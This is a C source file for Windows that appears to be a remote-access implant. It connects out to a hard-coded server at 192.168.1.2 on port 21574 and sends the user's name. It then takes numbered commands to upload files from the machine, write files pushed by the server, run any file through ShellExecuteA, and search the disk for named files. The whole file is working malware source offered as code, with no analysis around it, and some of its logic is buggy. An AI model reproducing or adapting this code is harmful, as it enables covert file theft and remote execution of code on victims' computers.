#include <string.h>
#include <stdio.h>
#include <string.h>
#include <WinSock2.h>
#include <ws2tcpip.h>
#include <winbase.h>
#include <Windows.h>
#include <wchar.h>
#include <stdbool.h>
// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")
#pragma warning (disable :4996)
#define MAX_PATH 260
#define LEN_FILENAME 40

typedef struct FindFile {
    wchar_t path[MAX_PATH]; // the path of the first searched directory
    wchar_t found_path[MAX_PATH]; // here returnes the file path found
    wchar_t fileName[LEN_FILENAME];
    bool found;

    struct FindFile* next;
}FINDFILE;

FINDFILE* initFileSearchCache(wchar_t path[MAX_PATH],wchar_t fileName[LEN_FILENAME]) {
    FINDFILE* newFindFile = calloc(1, sizeof(FINDFILE));
    if (path != NULL && fileName != NULL) {
        wcscpy(newFindFile->path, path);
        wcscpy(newFindFile->fileName, fileName);
    }

    newFindFile->found = false;
    return newFindFile;
}

FINDFILE* addToFileSearchCache(FINDFILE* source, FINDFILE* destination) {
    if (source == NULL) {
        return destination;
    }

    if (source->next == NULL) {
        source->next = destination;
        return source;
    }

    addToFileSearchCache(source->next,destination);

    return source;

}

char* stripFilePath(char* filePath) {
    int i;
    for(i = strlen(filePath) - 1; i >= 0; i--) {
        if (filePath[i] == L'/')
            break;
    }
    i++;

    char* fileName = calloc(strlen(filePath) - i + 1, sizeof(char));

    int nameSize = strlen(filePath) - i;
    for (int j = 0; j < nameSize ; j++,i++)
        fileName[j] = filePath[i];

    return fileName;
}

int getFileSize(FILE* file) {
    fseek(file, 0L, SEEK_END);
    int size = ftell(file);
    fseek(file, 0L, SEEK_SET);

    return size;
}

unsigned char* readFile(char* filePath, char* readMode, int* fileSize) {
    unsigned char* fileContent;

    FILE* file = fopen(filePath, readMode);
    if (!file) {
        printf("Open File : Error\n");
        return NULL;
    }

    *fileSize = getFileSize(file);
    if (*fileSize <= 0) {
        printf("FileSize Error\n");
        return NULL;
    }
    fileContent = malloc(sizeof(unsigned char) * (*fileSize));

    fread(fileContent, sizeof(unsigned char), *fileSize, file);
    fclose(file);

    return fileContent;
}

// error messages
// -1 = error_file_open
// -2 = error_write_to_file
//  1 = success
int writeFile(char* fileName, char* writeMode, unsigned char* fileContent, int fileSize) {
    FILE* file = fopen(fileName, writeMode);
    if (!file) {
        return -1;
    }

    int bytesWritten = fwrite(fileContent, 1, fileSize, file);
    if (bytesWritten <= 0 || bytesWritten != fileSize) {
        fclose(file);
        return -2;
    }
    fclose(file);

    return 1;
}

SOCKET* makeConnection(char* IpAddress,char* PORT) {
    SOCKET* clientSocket = calloc(1, sizeof(SOCKET));
    struct addrinfo hints, *results,*iteration;
    int iResult = -1;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    iResult = getaddrinfo(IpAddress, PORT, &hints, &results);
    if (iResult != 0) {
        printf("GetAddrInfo : ERROR\n");

        return NULL;
    }

    for (iteration = results; iteration != NULL; iteration = iteration->ai_next) {
        *clientSocket = socket(iteration->ai_family, iteration->ai_socktype, iteration->ai_protocol);
        if (*clientSocket == SOCKET_ERROR) {
            printf("SOCKET : ERROR\n");
            continue;
        }

        iResult = connect(*clientSocket, iteration->ai_addr, iteration->ai_addrlen);
        if (iResult != 0) {
            printf("Connect : Error\n");
            continue;
        }

        break;
    }

    if (iResult != 0) {
        printf("Connection Error..\n");
        return NULL;
    }

    freeaddrinfo(results);

    printf("Connected...\n");
    return clientSocket;

}

//messageLength is a pointer to an into,
//in order to return the size of the message received
unsigned char* receiveMessage(SOCKET ClientSocket,int* messageLength) {
    int iResult;
    int messageSize;
    unsigned char* message;

    iResult = recv(ClientSocket, &messageSize, sizeof(messageSize), MSG_PEEK);
    if (iResult <= 0) {
        return NULL;
    }

  
    iResult = recv(ClientSocket, &messageSize, sizeof(messageSize), MSG_WAITALL);
    if (iResult <= 0) {
        printf("Recv Msg Size : error\n");
        return NULL;
    }
   
    messageSize = ntohl(messageSize);
    message = calloc(messageSize + 1,sizeof(unsigned char));

    iResult = recv(ClientSocket, message, messageSize, MSG_WAITALL);
    if (iResult <= 0) {
        printf("Recv Msg Content : error\n");
        return NULL;
    }

    *messageLength = messageSize;
    return message;
    
}

//if MessageSize == 0 then use default strlen function to get the size
//this is used for sending big arrays and to not bottleneck the program
int sendMessage(SOCKET ClientSocket, char* message, int messageSize) {
    int iResult = -1;
    int messageLength = 0;
    int networkMessageLength;
    if (messageSize == 0) {
        messageLength = strlen(message);
        networkMessageLength = htonl(messageLength);
    }
    else {
        messageLength = messageSize;
        networkMessageLength = htonl(messageLength);
    }
    int total = 0;
  
    iResult = send(ClientSocket,&networkMessageLength, sizeof(networkMessageLength),0);
    if (iResult <= 0) {
        printf("Send : ERROR\n");
        return -1;
    }

    while (total != messageLength) {
        total += send(ClientSocket, message, messageLength, 0);
        if (total == -1) {
            printf("Send : ERROR\n");
            return -1;
        }
    }

    
    return total;
}

//error messages, 
//-1 = INVALID_FILE_PATH
//-2 = SOCKET_ERROR
// 1 = Success
int sendFile(SOCKET* ClientSocket,char* filePath) {
    char* fileName;
    unsigned char* fileContent;
    if (strlen(filePath) < 3)
        return -1;

    if (ClientSocket == NULL)
        return -2;

    int fileSize;
   
    fileContent = readFile(filePath, "rb", &fileSize);
    if (fileContent == NULL) {
        
        char NOTHING[] = "NOTHING";
        (void)sendMessage(*ClientSocket, "NOTHING.TXT", 0);
        (void)sendMessage(*ClientSocket, NOTHING, strlen(NOTHING));
        return -1;

    }

    fileName = stripFilePath(filePath);

    (void)sendMessage(*ClientSocket, fileName,0);
    (void)sendMessage(*ClientSocket, fileContent,fileSize);

    free(fileContent);
    free(fileName);

    return 1;
}

int receiveFile(SOCKET* ClientSocket) {
    int fileContentSize;
    unsigned char* fileName = receiveMessage(*ClientSocket,&fileContentSize);
    unsigned char* fileContent = receiveMessage(*ClientSocket,&fileContentSize);
    
    writeFile(fileName, "wb", fileContent, fileContentSize);

    free(fileName);
    free(fileContent);

    return 1;
}

FINDFILE findFile(FINDFILE PARAM) {
    
    WIN32_FIND_DATA file;
    HANDLE findfirstfile = FindFirstFile(PARAM.path, &file);
    PARAM.found = false;
    do {
       
        printf("%ls\n", file.cFileName);
        if (wcscmp(file.cFileName,PARAM.fileName) == 0) {
            PARAM.found = true;
            wcscpy(PARAM.found_path, PARAM.path);
            PARAM.found_path[wcslen(PARAM.found_path) - 1] = 0;
            wcscat(PARAM.found_path, file.cFileName);
            return PARAM;
        }


        if (file.dwFileAttributes & 16 && (wcscmp(file.cFileName, L".") != 0 && wcscmp(file.cFileName, L"..") != 0)) {
            PARAM.path[wcslen(PARAM.path) - 1] = 0;
            wcscat(PARAM.path, file.cFileName);
            wcscat(PARAM.path, L"/*");
            PARAM = findFile(PARAM);
            if (PARAM.found)
                return PARAM;

            //backtrack
            // -2 is from the "/*"
            PARAM.path[wcslen(PARAM.path) - wcslen(file.cFileName) - 2] = 0;
            wcscat(PARAM.path, L"*");

        }

    } while (FindNextFile(findfirstfile, &file));

    
    return PARAM;
}

DWORD WINAPI findFileThreaded(FINDFILE* PARAM) {
    *PARAM = findFile(*PARAM);

    return 1;

}

void sendUserName(SOCKET* ClientSocket) {
    char* userName = calloc(20,sizeof(unsigned char));
    DWORD userNameSize = 20;
    GetUserNameA(userName, &userNameSize);
    sendMessage(*ClientSocket, userName,strlen(userName));
    free(userName);
}


int main(int argc,char **argv) {
    int iResult = -1;
    char* message = NULL;
    WSADATA wsaData;
    SOCKET* socket = NULL;
    FINDFILE* file = NULL;
    int messageLength;
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup : ERROR\n");
        return -1;
    }

    while (true) {

        /* Check if connection is not NULL */
        if (socket == NULL) {
            socket = makeConnection("192.168.1.2", "21574");
            if (socket == NULL) {
                printf("Trying to reconnect...\n");
                socket = makeConnection("192.168.1.2", "21574");
                continue;
            }

            sendUserName(socket);

        }

        message = receiveMessage(*socket, &messageLength);
        if (message == NULL)
            continue;

        /* Receive File */
        if (strcmp(message, "1") == 0) { // receive file
            (void)receiveFile(socket);
        }

        /* Send File */
        else if (strcmp(message, "2") == 0) { 
            char* fileName = receiveMessage(*socket,&messageLength);
            printf("FILE NAME : %s\nFILE NAME LENGTH : %d\n", fileName, messageLength);
            if (strcmp(fileName, "SEARCHED_FILE") == 0) {
                free(fileName);
                fileName = calloc(MAX_PATH,sizeof(char));
                wcstombs(fileName, file->found_path, MAX_PATH);
                file->found = false;
            }
            sendFile(socket, fileName);
            free(fileName);
        }

        /* Execute File*/
        else if (strcmp(message, "3") == 0){ 
            char* fileName = receiveMessage(*socket, &messageLength);
            if (strcmp(fileName, "SEARCHED_FILE") == 0) {
                free(fileName);
                fileName = calloc(MAX_PATH, sizeof(char));
                wcstombs(fileName, file->found_path, MAX_PATH);
                file->found = false;
            }
            printf("FILE NAME : %s\nFILE NAME LENGTH : %d\n", fileName,messageLength);
            ShellExecuteA(NULL, "open", fileName, NULL, NULL, SW_SHOW);
            free(fileName);
        }

        /* Search for a File */
        else if (strcmp(message, "4") == 0) { // Search File
            char* fileName = receiveMessage(*socket, &messageLength);
            wchar_t* WCFileName = calloc(messageLength + 1, sizeof(wchar_t)); // messageLength + NULL_CHAR
            mbstowcs(WCFileName, fileName, messageLength + 1);

            char* path = receiveMessage(*socket, &messageLength);
            wchar_t* WCPath = calloc(messageLength + 1, sizeof(wchar_t)); // messageLength + NULL_CHAR
            mbstowcs(WCPath, path, messageLength + 1);

            FINDFILE* newFileSearch = initFileSearchCache(WCPath, WCFileName);
            
            printf("NAME : %ls\nPATH : %ls\n", newFileSearch->fileName, newFileSearch->path);
            LPDWORD THREADID;
            HANDLE search = CreateThread(NULL, 0, findFileThreaded, newFileSearch, 0, &THREADID);

            if (newFileSearch->found == true) 
                file = addToFileSearchCache(file, newFileSearch);
            else 
                free(newFileSearch);
            

            free(fileName);
            free(WCFileName);
            free(path);
            free(WCPath);
        }

        else if (strcmp(message, "print") == 0) {
            while (file != NULL)
                printf("%ls\n", file->found_path);
        }

        free(message);
    }

    WSACleanup();
    closesocket(*socket);
 
    return 0;
}